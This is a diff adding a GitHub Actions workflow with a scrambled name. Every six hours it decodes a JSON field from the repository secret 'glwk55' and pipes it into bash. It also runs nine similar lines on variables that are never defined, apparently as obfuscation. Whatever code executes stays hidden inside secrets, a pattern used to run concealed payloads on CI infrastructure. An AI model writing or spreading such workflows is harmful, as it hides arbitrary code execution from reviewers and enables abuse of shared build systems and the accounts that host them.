@@ -1,0 +1,26 @@
+name: pianzhangxianchenggong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pianzhangxianchenggong
+        env:
+          glwk55: ${{ secrets.glwk55 }}
+        run: |
+          echo $glwk55 | jq -r .w729 | /bin/bash
+          echo $j91 | jq -r .izry15731 | /bin/bash
+          echo $itdtd67584 | jq -r .v75377 | /bin/bash
+          echo $yqqq119 | jq -r .dpbgj2 | /bin/bash
+          echo $stk9 | jq -r .r8 | /bin/bash
+          echo $ink3 | jq -r .ixnpl0637 | /bin/bash
+          echo $j7 | jq -r .pkn0 | /bin/bash
+          echo $sme435 | jq -r .kxo840 | /bin/bash
+          echo $tcy8 | jq -r .dw5 | /bin/bash
+          echo $b2063 | jq -r .vac80934 | /bin/bash
+
